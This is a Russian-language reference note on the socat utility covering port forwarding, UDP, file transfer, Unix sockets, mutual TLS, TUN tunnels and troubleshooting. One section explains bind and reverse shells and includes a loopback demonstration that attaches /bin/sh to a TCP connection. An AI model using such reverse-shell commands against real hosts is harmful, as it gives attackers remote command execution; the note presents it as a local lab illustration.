# socat — TCP/UDP, Unix-сокеты, TLS и TUN

[**socat**](http://www.dest-unreach.org/socat/) (SOcket CAT) соединяет **два канала ввода-вывода** и передаёт данные между ними. Каналом может быть сеть, терминал, файл, Unix-сокет или запущенная программа. Практические задачи: временно пробросить порт, подключиться к Unix-сокету, добавить TLS перед TCP-сервисом, отладить протокол или связать виртуальные сетевые интерфейсы. Автор — Gerhard Rieger и участники проекта, лицензия GPLv2.

Основная модель: `адрес 1 ↔ socat ↔ адрес 2`. По умолчанию обмен двусторонний; `-u` оставляет направление **слева направо**, `-U` — справа налево. Порядок открытия адресов тоже важен: второй адрес обычно открывается после первого, например после принятия соединения слушателем.

В отличие от простого [netcat](Net%20Cat.md), socat позволяет сочетать разные типы каналов и настраивать каждый отдельно. Возможности конкретного `nc`/`ncat` зависят от реализации: например, `ncat` из Nmap умеет TLS через `--ssl`.

## Установка и возможности сборки

Устанавливается утилита, а не отдельная служба.

| Система | Установка | Особенности |
| :--- | :--- | :--- |
| Gentoo | `sudo emerge --ask net-misc/socat` | USE `ssl` включает TLS, `readline` — редактирование ввода, `ipv6` — IPv6. Для TLS проверить `ssl` через `emerge -pv net-misc/socat`; при необходимости добавить `net-misc/socat ssl` в файл под `/etc/portage/package.use/` и пересобрать |
| Debian / Ubuntu | `sudo apt update` и `sudo apt install socat` | Для выпуска тестовых сертификатов дополнительно нужен CLI `openssl` |
| Arch | `sudo pacman -Syu socat` | Официальный репозиторий Extra; для команд выпуска сертификатов установить также `openssl` |
| Entware armv7 | `opkg update` и `opkg install socat` | В [feed armv7sf-k3.2](https://bin.entware.net/armv7sf-k3.2/Packages) на 08.11.2026 есть `socat 1.8.0.3-2`, зависимость `libopenssl`; бинарник обычно `/opt/bin/socat` |

Источники пакетов: [Gentoo](https://packages.gentoo.org/packages/net-misc/socat), [Debian](https://packages.debian.org/trixie/socat), [Arch](https://archlinux.org/packages/extra/x86_64/socat/). Наличие TLS и TUN нужно проверять **в установленной сборке**; пакет Entware сам по себе не добавляет драйвер TUN в ядро роутера.

<details><summary>Версия, справка и собранные возможности</summary>

```bash
socat -V
socat -hh
```

</details>

В выводе `-V` ищи `WITH_OPENSSL`, `WITH_TUN`, `WITH_PTY`: `#define … 1` означает включённую возможность, `#undef …` — отключённую.

На 08.11.2026 на официальной странице последняя версия — **1.8.1.3**. В **1.8.1.2** исправлен heap overflow в клиентском парсере SOCKS5, в **1.8.1.3** — связанный тест. [Advisory 10](http://www.dest-unreach.org/socat/contrib/socat-secadv10.html) (CVE-2026-56123) указывает затронутые upstream-версии **1.8.0.0–1.8.1.1**. Для пакетов дистрибутива учитывай перенесённые исправления: сам номер старой версии не доказывает наличие или отсутствие патча. Например, в Debian 13 пакет `1.8.0.3-1+deb13u1` (03.09.2026) уже содержит исправление CVE-2026-56123, а `1.8.0.3-2` из Entware попадает в затронутый диапазон. На старой сборке Entware не стоит подключаться к недоверенному SOCKS5-прокси без проверки исправления.

## Синтаксис и адреса

Общая форма: `socat [общие опции] адрес1 адрес2`. Тип адреса отделяется от параметров двоеточием, опции адреса — **запятыми без пробелов**. Общие опции вроде `-d -d` стоят до адресов. Пробелы внутри команды `EXEC` защищают кавычками.

| Адрес | Что открывает |
| :--- | :--- |
| `STDIO` или `-` | stdin для чтения и stdout для записи: двусторонняя работа с терминалом |
| `STDIN`, `STDOUT` | Только соответствующий файловый дескриптор; `STDOUT` — адрес для записи, а не замена `STDIO` |
| `TCP4:host:port`, `TCP6:[::1]:port` | Исходящее TCP-соединение по IPv4 или IPv6 |
| `TCP4-LISTEN:port` | Ожидание входящего TCP-соединения |
| `UDP4:host:port`, `UDP4-RECV:port` | Отправка/обмен UDP с заданным узлом; приём датаграмм |
| `UDP4-LISTEN:port` | Ожидание первой датаграммы и последующий обмен с её отправителем |
| `UNIX-CONNECT:path`, `UNIX-LISTEN:path` | Подключение к Unix-сокету или создание слушателя |
| `OPEN:path`, `CREATE:path` | Файл/устройство; создание файла назначения |
| `EXEC:command` | Процесс, чей ввод-вывод связывается со вторым каналом |
| `PTY` | Псевдотерминал; полезен для программ, которым нужен терминал |
| `OPENSSL:host:port`, `OPENSSL-LISTEN:port` | TLS-клиент и TLS-сервер поверх TCP |
| `PROXY:proxy:host:port` | Подключение через HTTP-прокси методом CONNECT, порт прокси задаётся `proxyport=` |
| `SOCKS4`, `SOCKS4A`, `SOCKS5-CONNECT` | Клиентское подключение через соответствующий прокси; SOCKS5 появился в ветке 1.8 |
| `TUN:address/prefix` | Виртуальный интерфейс Linux, передающий IP-пакеты |

`EXEC` запускает программу без обычной обработки командной строки оболочкой. Если нужны конвейеры и перенаправления, существует `SYSTEM`, который исполняет команду через shell; не подставляй туда недоверенные строки.

| Опция | Назначение |
| :--- | :--- |
| `-d -d` | Диагностика открытия адресов, подключений и завершения |
| `-v`, `-x` | Содержимое трафика в текстовом/hex-виде, обычно в stderr |
| `-T 30` | Завершение при отсутствии передачи данных 30 секунд |
| `-t 2` | Время ожидания завершения второго направления после EOF в первом; это другой таймаут |
| `bind=127.0.0.1` | Привязка слушателя к loopback |
| `reuseaddr` | Повторное использование локального адреса сокета; не разрешение занять уже работающий слушатель |
| `fork` | Дочерний процесс для нового соединения; родитель продолжает слушать, но не уходит автоматически в фон |
| `range=192.0.2.0/24` | Ограничение адресов клиентов у поддерживающего эту опцию слушателя; не проверка личности |
| `connect-timeout=5` | Ограничение времени установления исходящего соединения |

## TCP: клиент, echo и переадресация

Лабораторные команды используют loopback и непривилегированные порты. Серверы запускай в одном терминале, клиенты — в другом. Остановка слушателя — `Ctrl+C`. Если порт занят, замени его на свободный в обеих связанных командах.

<details><summary>TCP echo: сервер и двусторонний клиент</summary>

```bash
# Терминал 1: для каждого подключения запускается cat
socat -d -d TCP4-LISTEN:9000,bind=127.0.0.1,reuseaddr,fork EXEC:/bin/cat

# Терминал 2: набирай строки, сервер возвращает их обратно
socat STDIO TCP4:127.0.0.1:9000
```

</details>

<details><summary>Переадресация 127.0.0.1:8080 на echo-сервер :9000</summary>

```bash
# Echo-сервер :9000 из предыдущего примера должен работать
socat -d -d TCP4-LISTEN:8080,bind=127.0.0.1,reuseaddr,fork TCP4:127.0.0.1:9000,connect-timeout=5

# В другом терминале
socat STDIO TCP4:127.0.0.1:8080
```

</details>

Для реального сервиса замени **правый** адрес на его хост и порт. TCP-проброс передаёт байты: сам по себе он не меняет HTTP `Host`, не завершает TLS и не превращает протокол приложения в другой. Если убрать `bind=127.0.0.1`, слушатель может стать доступен с других интерфейсов. Без `fork` обычный TCP-слушатель обслужит одно соединение и завершится.

## UDP: датаграммы и время ожидания

У UDP нет TCP-handshake и обычного EOF. `UDP-LISTEN` выбирает собеседника по первой датаграмме; это не универсальный сервер всех UDP-клиентов и не подтверждение доступности удалённого приложения. Для длительного ожидания полезен таймаут простоя.

<details><summary>Односторонняя отправка сообщения по UDP</summary>

```bash
# Терминал 1: принимать датаграммы и печатать содержимое
socat -u UDP4-RECV:9002,bind=127.0.0.1,reuseaddr STDOUT

# Терминал 2
printf 'udp probe\n' | socat -u STDIN UDP4:127.0.0.1:9002
```

</details>

Успешное завершение отправителя означает отправку датаграммы локальным стеком, а не её гарантированную доставку. UDP через TCP нельзя считать прозрачным туннелем: TCP не сохраняет границы сообщений. Для DNS и других многоклиентских протоколов нужно отдельно продумывать сопоставление запросов, ответов и таймауты.

## Передача файла

Для файла задаём **одно направление**, используем отдельный файл назначения и сверяем хеш. Пример передаёт данные открытым TCP; для конфиденциальных файлов используй SSH/SCP либо TLS с проверкой сертификатов.

<details><summary>Передать demo.bin в received.bin на той же машине</summary>

```bash
# Терминал 1: CREATE создаёт или обрезает файл назначения
socat -u TCP4-LISTEN:9001,bind=127.0.0.1,reuseaddr CREATE:received.bin,perm=0600

# Терминал 2: demo.bin уже должен существовать
socat -u OPEN:demo.bin,rdonly TCP4:127.0.0.1:9001

# После завершения обоих процессов хеши должны совпасть
sha256sum demo.bin received.bin
```

</details>

Не добавляй `fork` к такому приёмнику: несколько подключений начнут писать в один файл. `perm=0600` задаёт права при создании, но не исправляет права уже существующего файла.

## Unix-сокет и PTY

К Unix-сокету можно подключиться без TCP-порта. Запускай пример в отдельном рабочем каталоге, где ещё нет `echo.sock`.

<details><summary>Локальный echo через Unix-сокет</summary>

```bash
# Терминал 1
socat UNIX-LISTEN:./echo.sock,mode=0600,fork EXEC:/bin/cat

# Терминал 2, тот же каталог
socat STDIO UNIX-CONNECT:./echo.sock
```

</details>

PTY нужен, когда подключаемая программа проверяет, что работает с терминалом. Опции `pty,setsid,ctty` создают терминал и делают его управляющим для процесса; `stderr` добавляет вывод ошибок в канал, `echo=0` отключает повтор введённых символов на стороне PTY. Для бинарных данных терминальные преобразования нужно отключать отдельно: обычный терминал не гарантирует сохранность каждого байта.

Публикация административного Unix-сокета через TCP передаёт сетевым клиентам его полномочия. Особенно опасны сокеты управления контейнерами и гипервизорами; ограничение доступа к исходному файлу не защищает уже созданный TCP-проброс.

## TLS с взаимной проверкой сертификатов

Название адреса `OPENSSL` историческое: оно не требует устаревшего SSL. В примере минимум **TLS 1.2**, отдельные ключи сервера/клиента и явный `verify=1` на обеих сторонах. Это локальная лаборатория с двумя самоподписанными сертификатами, каждый из которых заранее доверен другой стороне.

<details><summary>Создать тестовые сертификаты в отдельном каталоге</summary>

```bash
# Выполнить один раз в новом рабочем каталоге
umask 077
openssl req -x509 -newkey rsa:2048 -noenc -sha256 -days 30 \
  -subj '/CN=localhost' -addext 'subjectAltName=DNS:localhost' \
  -keyout server.key -out server.crt
openssl req -x509 -newkey rsa:2048 -noenc -sha256 -days 30 \
  -subj '/CN=socat-client' \
  -keyout client.key -out client.crt
chmod 600 server.key client.key
```

</details>

`-noenc` — синтаксис OpenSSL 3; ключ остаётся незашифрованным, поэтому важны права и защищённое хранение. При работе на разных машинах серверу нужны **его** `server.key/server.crt` и доверенный `client.crt`, клиенту — **его** `client.key/client.crt` и доверенный `server.crt`. Ключ другой стороны передавать не нужно. Подлинность доверенных сертификатов проверяют при передаче: их подмена меняет того, кому доверяешь.

<details><summary>mTLS echo: сервер :9443 и клиент с проверкой имени</summary>

```bash
# Терминал 1: принимает только доверенный клиентский сертификат
socat -d -d OPENSSL-LISTEN:9443,pf=ip4,bind=127.0.0.1,reuseaddr,fork,cert=server.crt,key=server.key,cafile=client.crt,verify=1,openssl-commonname=socat-client,openssl-min-proto-version=TLS1.2 EXEC:/bin/cat

# Терминал 2: IP подключения отличается от имени в сертификате,
# поэтому ожидаемое имя задаём явно
socat STDIO OPENSSL:127.0.0.1:9443,cert=client.crt,key=client.key,cafile=server.crt,verify=1,openssl-commonname=localhost,openssl-min-proto-version=TLS1.2
```

</details>

Если заменить серверный `EXEC:/bin/cat` на `TCP4:127.0.0.1:9000`, получится TLS-обёртка перед локальным TCP-сервисом. Между клиентом и socat будет TLS, а от socat до backend — обычный TCP; backend не должен иметь отдельного незащищённого пути доступа извне.

`cafile` определяет доверенные сертификаты, `cert`/`key` — собственную личность. Проверка имени дополняет проверку доверия. Клиент socat проверяет имя сервера начиная с **1.7.3.0**; на сервере ожидаемое имя клиента можно задать явно. Это уточняет исторические абзацы [официального TLS-руководства](http://www.dest-unreach.org/socat/doc/socat-openssltunnel.html).

**`verify=0` отключает проверку сертификата собеседника.** Трафик может быть зашифрован, но личность другой стороны не подтверждена, возможна подмена посредником. Сервер с отключённой проверкой клиентского сертификата также не получает аутентификацию клиентов средствами mTLS. Для рабочего туннеля нужен доверенный сертификат/CA и проверка имени, а не просто нечитаемый дамп Wireshark.

## TUN: виртуальная IP-сеть поверх UDP

[Официальное руководство TUN](http://www.dest-unreach.org/socat/doc/socat-tun.html) связывает два интерфейса Linux через UDP. Это **передача IP-пакетов**, а не переадресация одного TCP-порта. TUN работает на L3; TAP — с Ethernet-кадрами на L2.

Нужны `WITH_TUN`, `/dev/net/tun`, поддержка `CONFIG_TUN` в ядре и права настройки интерфейса (обычно root/`CAP_NET_ADMIN`). Адреса виртуальной сети должны не пересекаться с существующими маршрутами. Ниже `192.0.2.10` — **условный внешний адрес сервера**, замени его; `10.203.0.0/30` — пример отдельной виртуальной сети.

<details><summary>Два Linux-хоста: TUN поверх UDP, только в доверенной лаборатории</summary>

```bash
# Сервер: ждёт первую UDP-датаграмму, затем создаёт интерфейс
sudo socat -d -d UDP4-LISTEN:11443,reuseaddr TUN:10.203.0.1/30,tun-name=socat0,up

# Клиент: подключается к внешнему адресу сервера
sudo socat -d -d UDP4:192.0.2.10:11443 TUN:10.203.0.2/30,tun-name=socat0,up

# На клиенте, в другом терминале: первый ping запускает обмен
ping -c 3 10.203.0.1

# Проверка интерфейса и маршрута
ip address show dev socat0
ip route show dev socat0
```

</details>

На сервере интерфейс может появиться **только после первой датаграммы**. Не добавляй `fork` к этой паре: интерфейс рассчитан на одного собеседника. Для связи двух TUN-адресов не требуется включать IP forwarding; он нужен, если хосты должны маршрутизировать трафик **дальше**, в другие сети, вместе с маршрутами туда/обратно и правилами firewall.

Этот UDP-туннель **не шифрует и не аутентифицирует** пакеты. Для защищённого опыта у socat есть `OPENSSL-DTLS-CLIENT`/`OPENSSL-DTLS-SERVER`; нужны сертификаты, проверка сторон и подбор размеров датаграмм. Для постоянной VPN-сети обычно удобнее специализированное решение с управлением ключами и переподключением.

В руководстве упомянут TCP с `nodelay`, но это не добавляет границы сообщений в TCP. Для переноса отдельных TUN-пакетов выбирай транспорт, сохраняющий датаграммы, например UDP/DTLS. Также учитывай MTU внешнего канала и накладные расходы инкапсуляции: успешный маленький ping ещё не подтверждает передачу больших пакетов.

## Bind/reverse shell и уточнения к статьям

В [CISOCLUB](https://cisoclub.ru/socat-dlya-pentestinga/) и [KBoffsec](https://kb.offsec.nl/tools/networking/socat/) показаны bind/reverse shell, TLS и передача файлов. Механизм тот же: `EXEC` связывает процесс с сетевым каналом. **Bind shell** ждёт входящего подключения на машине с оболочкой; **reverse shell** сам устанавливает исходящее подключение к слушателю. NAT не гарантирует работоспособность: исходящий доступ и политика firewall тоже имеют значение.

Для собственной лаборатории достаточно демонстрации на loopback. Здесь оболочка неинтерактивная; PTY и управление терминалом — отдельная настройка. Оболочка работает с правами пользователя, запустившего socat.

<details><summary>Локальная демонстрация reverse shell без публикации порта наружу</summary>

```bash
# Терминал 1: двусторонний ввод-вывод слушателя
socat -d -d TCP4-LISTEN:9003,bind=127.0.0.1,reuseaddr STDIO

# Терминал 2: оболочка сама подключается к слушателю
socat TCP4:127.0.0.1:9003 EXEC:/bin/sh

# В терминале 1 введи: id
# Для завершения введи: exit
```

</details>

Такой сетевой канал не содержит самостоятельной аутентификации. Для обычного администрирования используй [SSH](SSH/SSH-%D0%91%D0%B0%D0%B7%D0%BE%D0%B2%D0%BE%D0%B5%20%D1%80%D1%83%D0%BA%D0%BE%D0%B2%D0%BE%D0%B4%D1%81%D1%82%D0%B2%D0%BE.md); см. также [Reverse Shell](Reverse%20Shell.md).

При переносе команд из статей:

- Для ввода команд и чтения ответа нужен **`STDIO`/`-`**, а `STDOUT` предназначен для вывода. В обоих сборниках встречается reverse-listener с `STDOUT`.
- В CISOCLUB есть типографское `–` вместо адреса `-`, слитное `-OPENSSL-LISTEN` и пробелы после запятых. Для socat это значимые ошибки синтаксиса.
- В примере encrypted reverse shell у KBoffsec серверная строка содержит только один адрес; команде socat нужны два.
- Для передачи файла явно задавай направление и создание/обрезку назначения, как в примере выше. Размещение файла на TCP-порту не добавляет ни шифрования, ни контроля доступа.

## Диагностика и границы проверки

| Симптом | Что проверить |
| :--- | :--- |
| `unknown device/address OPENSSL` или `TUN` | Соответствующий `WITH_…` в `socat -V`; набор адресов в `-hh` |
| `Address already in use` | Другой слушатель, адрес привязки; `reuseaddr` не вытесняет работающий процесс |
| `Permission denied` | Права на Unix-сокет/файл, привязку порта, TUN и настройку интерфейса |
| TLS `certificate verify failed` | Правильный `cafile`, имя, срок действия и часы; для mTLS — сертификат и ключ на обеих сторонах |
| UDP-слушатель ждёт | До первой датаграммы это нормально; у UDP нет обычного установления соединения |
| TUN не передаёт пакеты | Первая датаграмма, интерфейс `UP`, маршруты, firewall и MTU |

Для анализа обмена подходят `-d -d`, затем при необходимости `-v`/`-x`. Дампы содержат прикладные данные, а у TLS-адреса могут показывать **уже расшифрованный** трафик. Не сохраняй в публичные логи пароли и содержимое рабочих сессий.

Код выхода клиента сам по себе не подтверждает прохождение mTLS: при быстром закрытии stdin в локальном тесте клиент мог завершиться с `0`, хотя сервер отклонил отсутствующий сертификат. Проверяй фактический обмен и серверный журнал, а не только `$?`.

Примеры сверены с официальной man page на 08.11.2026. Локальная проверка выполнена на Linux с **socat 1.8.1.3**: TCP echo/проброс, UDP, файл, Unix-сокет, reverse shell на loopback, mTLS и TLS-обёртка перед TCP, включая отказ при неверном имени и отсутствии клиентского сертификата. Команды извлечены из заметки, для теста подставлены свободные порты loopback. Установка пакетов на четырёх системах не выполнялась. TUN-пара сверена с документацией, но не запущена: в проверочной среде отсутствует `/dev/net/tun`.
